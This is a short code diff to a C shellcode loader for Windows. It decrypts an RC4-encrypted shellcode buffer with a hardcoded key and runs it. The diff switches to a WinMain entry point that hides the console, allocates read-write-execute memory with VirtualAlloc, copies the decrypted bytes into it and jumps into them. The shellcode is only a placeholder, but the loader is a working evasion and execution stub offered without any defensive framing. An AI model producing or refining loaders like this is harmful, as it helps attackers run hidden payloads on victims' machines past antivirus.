@@ -1,5 +1,6 @@
-__attribute__((section(".text")))
-unsigned char buf[] = </*shellcode*/>;
+#include <windows.h>
+
+unsigned char buf[] = { /* <shellcode> */ };
 
 const unsigned char KEY[] = "\x73\x65\x63\x72\x65\x74";
 const unsigned int KEY_LEN = sizeof(KEY) - 1;
@@ -31,8 +32,11 @@ void rc4_decrypt(unsigned char* data, unsigned int data_len, const unsigned char
     }
 }
 
-int main() {
+int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
     rc4_decrypt(buf, sizeof(buf), KEY, KEY_LEN);
-    (*(void(*)())(&buf))();
+    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    unsigned char* dst = (unsigned char*)exec;
+    for (unsigned int i = 0; i < sizeof(buf); i++) dst[i] = buf[i];
+    ((void(*)())exec)();
     return 0;
 }
